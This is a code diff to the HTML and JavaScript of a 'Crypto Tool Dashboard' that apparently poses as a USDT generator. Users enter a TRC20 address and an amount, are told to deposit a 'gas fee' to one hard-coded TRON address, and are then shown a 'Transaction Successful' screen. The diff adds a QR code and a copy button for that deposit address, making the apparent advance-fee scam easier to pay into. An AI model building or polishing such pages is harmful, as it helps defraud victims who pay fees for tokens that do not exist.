@@ -238,7 +238,9 @@
       flex-direction: column;
       z-index: 9999;
       color: var(--primary);
-      font-family: 'VT323', monospace;
+      font-family: "VT323", monospace;
+      padding: 20px;
+      text-align: center;
     }
     .loading-spinner {
       border: 5px solid #000;
@@ -271,6 +273,21 @@
       50% {
         transform: translateY(-13px);
       }
+    }
+    /* QR code */
+    .qr-code {
+      margin: 14px auto 16px auto;
+      width: 160px;
+      height: 160px;
+      border: 3px solid var(--primary);
+      border-radius: 12px;
+      cursor: pointer;
+      filter: drop-shadow(0 0 3px var(--primary));
+      transition: transform 0.25s ease-in-out;
+      user-select: none;
+    }
+    .qr-code:hover {
+      transform: scale(1.07);
     }
     /* Responsive: Mobile Stack */
     @media (max-width: 900px) {
@@ -312,9 +329,15 @@
         <i class="fa fa-tools"></i> Crypto Tool Dashboard
       </div>
       <div class="dashboard-actions">
-        <button class="action-btn active"><i class="fa fa-dashboard"></i> Dashboard</button>
-        <button class="action-btn"><i class="fa fa-user"></i> Profile</button>
-        <button class="action-btn"><i class="fa fa-support"></i> Support</button>
+        <button class="action-btn active">
+          <i class="fa fa-dashboard"></i> Dashboard
+        </button>
+        <button class="action-btn">
+          <i class="fa fa-user"></i> Profile
+        </button>
+        <button class="action-btn">
+          <i class="fa fa-support"></i> Support
+        </button>
       </div>
     </div>
     <!-- Panel Area -->
@@ -326,13 +349,22 @@
           <label for="usdt-address"><i class="fa fa-wallet"></i> USDT TRC20 Address</label>
           <input type="text" id="usdt-address" placeholder="Enter TRC20 address" required />
           <label for="amount-input"><i class="fa fa-dollar-sign"></i> Amount (USDT)</label>
-          <input type="number" id="amount-input" placeholder="Enter amount (min 1000)" min="1000" max="500000" />
-          <button class="form-btn" type="submit"><i class="fa fa-bolt"></i> Generate</button>
+          <input
+            type="number"
+            id="amount-input"
+            placeholder="Enter amount (min 1000)"
+            min="1000"
+            max="500000"
+          />
+          <button class="form-btn" type="submit">
+            <i class="fa fa-bolt"></i> Generate
+          </button>
         </form>
         <div class="card-summary">
           <i class="fa fa-info-circle"></i>
           Gas Fee is <b>20 TRX</b> per 1,000 USDT.<br />
-          Gas Address: <span style="font-family: monospace">TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA</span>
+          Gas Address:
+          <span style="font-family: monospace">TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA</span>
         </div>
       </div>
       <!-- Recent Transactions -->
@@ -344,26 +376,45 @@
     </div>
   </div>
 
-  <!-- Waiting overlay -->
+  <!-- Waiting & Deposit Overlay -->
   <div class="overlay" id="waiting-overlay">
+    <div>Please deposit the gas fee to the address below</div>
+    <img
+      id="gas-qr"
+      class="qr-code"
+      src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA"
+      alt="Gas Address QR Code"
+      title="Click to copy gas address"
+      onclick="copyGasAddress()"
+    />
+    <div style="font-family: monospace; font-size: 1.2em; letter-spacing: 1.5px; margin-bottom: 14px;">
+      TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA
+    </div>
     <div class="loading-spinner"></div>
-    <div>Please deposit the gas fee to the above address.</div>
-    <div id="countdown-timer" style="margin-top:15px; font-size: 1.4em; font-weight: bold;"></div>
+    <div id="countdown-timer" style="margin-top: 15px; font-size: 1.4em; font-weight: bold;"></div>
   </div>
 
   <!-- Success overlay -->
   <div class="overlay" id="success-overlay">
     <div class="success-icon"><i class="fa fa-circle-check"></i></div>
-    <div style="font-size:1.2em; margin-bottom: 8px;">Transaction Successful!</div>
+    <div style="font-size: 1.2em; margin-bottom: 8px;">Transaction Successful!</div>
     <div>
       Amount: <span id="success-amount">0</span> USDT<br />
       TXID: <span id="success-txid"></span><br />
       Time: <span id="success-time"></span>
     </div>
-    <button class="form-btn" style="margin-top:20px; max-width:200px;" onclick="closeSuccess()">New Transaction</button>
+    <button
+      class="form-btn"
+      style="margin-top: 20px; max-width: 200px;"
+      onclick="closeSuccess()"
+    >
+      New Transaction
+    </button>
   </div>
 
   <script>
+    const GAS_ADDRESS = "TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA";
+
     // Helper: Validate TRC20 address format
     function validateAddress(address) {
       return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address.trim());
@@ -457,6 +508,12 @@
     const successAmountElem = document.getElementById("success-amount");
     const successTxidElem = document.getElementById("success-txid");
     const successTimeElem = document.getElementById("success-time");
+
+    // Copy gas address to clipboard
+    function copyGasAddress() {
+      navigator.clipboard.writeText(GAS_ADDRESS);
+      alert("Gas address copied to clipboard!");
+    }
 
     // Close success overlay (reset form)
     function closeSuccess() {
